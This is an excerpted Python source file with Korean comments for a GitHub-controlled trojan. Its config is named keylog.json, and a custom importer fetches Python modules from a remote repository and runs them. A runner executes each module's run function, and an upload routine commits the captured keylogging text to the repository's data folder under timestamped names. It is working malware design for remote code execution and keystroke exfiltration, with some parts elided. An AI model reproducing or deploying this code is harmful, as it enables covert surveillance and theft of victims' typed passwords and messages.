...
# My Github Structure
# khw5123(Name) - moonriver(Repository) - master(Branch) - config - keylog.json
#                                                        - data - 키로깅 텍스트 파일이 저장될 위치
#                                                        - modules - keylog.py 

trojan_config="keylog.json" # moonriver - master - config 디렉터리에 있는 json 파일
data_path="data/"# 키로깅 파일이 저장될 위치
trojan_modules=[]
...
GithubBranch="master" # Branch

class GitImporter(object): # 깃허브 저장소로부터 라이브러리를 가져오는 모듈 임포터 클래스
    def __init__(self):
        self.current_module_code="" # moonriver - master - modules 디렉터리에 있는 파이썬 파일의 코드가 저장될 변수
...
def store_module_result(data): # moonriver - master - modules 디렉터리에 있는 파이썬 파일의 run 함수의 반환값(키로깅 문자열)을 moonriver - master - data 디렉터리에 업로드하는 함수
    gh,repo,branch=connect_to_github() # connect_to_github 함수를 호출해 Repository & Branch 객체 저장
    saveFileName=str(datetime.today().year)+"-"+str(datetime.today().month)+"-"+str(datetime.today().day)+"-"+str(datetime.today().hour)+"-"+str(datetime.today().minute)+"-"+str(datetime.today().second)+".txt" # moonriver - master - data 에 저장될 파일명으로 업로드 시간으로 설정
    remote_path="%s%s" % (data_path, saveFileName) # moonriver - master - modules - data/saveFileName run 함수의 반환값 저장 경로 설정
...
def module_runner(module): # 깃허브 저장소의 파이썬 파일을 실행하고 반환값을 저장소로 업로드하는 함수
    task_queue.put(1)
    result=sys.modules[module].run() # moonriver - master - modules 디렉터리에 있는 파이썬 파일의 run 함수를 호출해 모듈 실행
    task_queue.get()
